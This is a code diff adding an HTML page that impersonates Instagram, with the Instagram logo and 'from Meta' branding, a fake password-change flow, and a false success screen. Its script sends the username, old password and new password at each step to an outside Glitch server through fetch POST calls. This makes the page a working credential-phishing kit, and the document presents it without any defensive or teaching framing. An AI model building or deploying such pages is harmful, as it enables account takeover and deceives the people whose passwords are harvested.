@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Clone</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: sans-serif;
+        background: #fff;
+        text-align: center;
+      }
+      .screen {
+        display: none;
+        height: 100vh;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        position: relative;
+      }
+      .active {
+        display: flex !important;
+      }
+      .meta-text {
+        position: absolute;
+        bottom: 20px;
+        font-size: 14px;
+        color: #666;
+      }
+      .meta-text span {
+        color: #fb3958;
+        font-weight: bold;
+      }
+      .form-container {
+        width: 90%;
+        max-width: 400px;
+        text-align: left;
+        position: relative;
+      }
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        margin: 10px 0 2px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+      }
+      .next-btn {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        margin-top: 10px;
+        border: none;
+        border-radius: 5px;
+        color: white;
+        cursor: pointer;
+        background-color: #0095f6;
+        position: relative;
+        z-index: 2;
+      }
+      .checkmark {
+        font-size: 60px;
+        color: green;
+      }
+      .error-msg {
+        color: red;
+        font-size: 13px;
+        margin: 0 0 10px 0;
+        height: 16px;
+      }
+      /* Loader */
+      .loader {
+        border: 4px solid #f3f3f3; /* Light gray */
+        border-top: 4px solid #0095f6; /* Blue */
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        margin-top: -15px;
+        margin-left: -15px;
+        z-index: 3;
+        display: none;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="screen active" id="logoScreen">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+        alt="Instagram Logo"
+        width="80"
+      />
+      <div class="meta-text">from <span>Meta</span></div>
+    </div>
+
+    <div class="screen" id="usernameScreen">
+      <h2>Register</h2>
+      <div>English (UK)</div>
+      <div class="form-container">
+        <input type="text" placeholder="Username" id="username" />
+        <div id="usernameError" class="error-msg"></div>
+        <button class="next-btn" onclick="goToOldPasswordScreen(this)">
+          Next
+        </button>
+        <div class="loader" id="loaderUsername"></div>
+      </div>
+    </div>
+
+    <div class="screen" id="oldPasswordScreen">
+      <h2>Old Password</h2>
+      <div class="form-container">
+        <input type="password" placeholder="Old Password" id="oldPassword" />
+        <div id="oldPasswordError" class="error-msg"></div>
+        <button class="next-btn" onclick="goToNewPasswordScreen(this)">
+          Next
+        </button>
+        <div class="loader" id="loaderOldPassword"></div>
+      </div>
+    </div>
+
+    <div class="screen" id="newPasswordScreen">
+      <h2>New Password</h2>
+      <div class="form-container">
+        <input type="password" placeholder="New Password" id="newPassword" />
+        <div id="newPasswordError" class="error-msg"></div>
+        <input
+          type="password"
+          placeholder="Confirm New Password"
+          id="confirmPassword"
+        />
+        <div id="confirmPasswordError" class="error-msg"></div>
+        <button class="next-btn" onclick="goToSuccessScreen(this)">
+          Submit
+        </button>
+        <div class="loader" id="loaderNewPassword"></div>
+      </div>
+    </div>
+
+    <div class="screen" id="successScreen">
+      <div class="checkmark">✔</div>
+      <p>Success</p>
+    </div>
+
+    <script>
+      let savedUsername = "";
+      let savedOldPassword = "";
+
+      setTimeout(() => {
+        document.getElementById("logoScreen").classList.remove("active");
+        document.getElementById("usernameScreen").classList.add("active");
+      }, 3000);
+
+      function sendData(data) {
+        fetch("https://handsome-dolomite-trunk.glitch.me/api/saveUser", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+        })
+          .then((response) => {
+            if (!response.ok) throw new Error("Server error");
+            return response.json();
+          })
+          .then((data) => {
+            console.log("Data sent:", data);
+          })
+          .catch((err) => {
+            console.error("Failed to send:", err);
+          });
+      }
+
+      // Helper to show loader for 5 seconds, then switch screen
+      function showLoaderThenSwitch(loaderId, fromScreenId, toScreenId) {
+        const loader = document.getElementById(loaderId);
+        const fromScreen = document.getElementById(fromScreenId);
+        const toScreen = document.getElementById(toScreenId);
+
+        loader.style.display = "block";
+
+        // Disable all buttons while loading
+        fromScreen
+          .querySelectorAll("button")
+          .forEach((btn) => (btn.disabled = true));
+
+        setTimeout(() => {
+          loader.style.display = "none";
+          fromScreen
+            .querySelectorAll("button")
+            .forEach((btn) => (btn.disabled = false));
+          fromScreen.classList.remove("active");
+          toScreen.classList.add("active");
+        }, 5000);
+      }
+
+      function goToOldPasswordScreen(button) {
+        const usernameInput = document.getElementById("username");
+        const usernameError = document.getElementById("usernameError");
+        const username = usernameInput.value.trim();
+
+        if (!username) {
+          usernameError.textContent = "Username cannot be empty.";
+          return;
+        } else {
+          usernameError.textContent = "";
+        }
+
+        savedUsername = username;
+        sendData({ username });
+
+        showLoaderThenSwitch(
+          "loaderUsername",
+          "usernameScreen",
+          "oldPasswordScreen"
+        );
+      }
+
+      function goToNewPasswordScreen(button) {
+        const oldPasswordInput = document.getElementById("oldPassword");
+        const oldPasswordError = document.getElementById("oldPasswordError");
+        const oldPassword = oldPasswordInput.value.trim();
+
+        if (!oldPassword) {
+          oldPasswordError.textContent = "Old password cannot be empty.";
+          return;
+        } else {
+          oldPasswordError.textContent = "";
+        }
+
+        savedOldPassword = oldPassword;
+        sendData({ username: savedUsername, oldPassword });
+
+        showLoaderThenSwitch(
+          "loaderOldPassword",
+          "oldPasswordScreen",
+          "newPasswordScreen"
+        );
+      }
+
+      function goToSuccessScreen(button) {
+        const newPasswordInput = document.getElementById("newPassword");
+        const confirmPasswordInput = document.getElementById("confirmPassword");
+        const newPasswordError = document.getElementById("newPasswordError");
+        const confirmPasswordError = document.getElementById(
+          "confirmPasswordError"
+        );
+
+        const newPassword = newPasswordInput.value.trim();
+        const confirmPassword = confirmPasswordInput.value.trim();
+
+        let valid = true;
+
+        if (!newPassword) {
+          newPasswordError.textContent = "New password cannot be empty.";
+          valid = false;
+        } else {
+          newPasswordError.textContent = "";
+        }
+
+        if (!confirmPassword) {
+          confirmPasswordError.textContent =
+            "Please confirm your new password.";
+          valid = false;
+        } else if (newPassword !== confirmPassword) {
+          confirmPasswordError.textContent = "Passwords do not match.";
+          valid = false;
+        } else {
+          confirmPasswordError.textContent = "";
+        }
+
+        if (!valid) return;
+
+        sendData({
+          username: savedUsername,
+          oldPassword: savedOldPassword,
+          newPassword,
+        });
+
+        showLoaderThenSwitch(
+          "loaderNewPassword",
+          "newPasswordScreen",
+          "successScreen"
+        );
+      }
+    </script>
+  </body>
+</html>
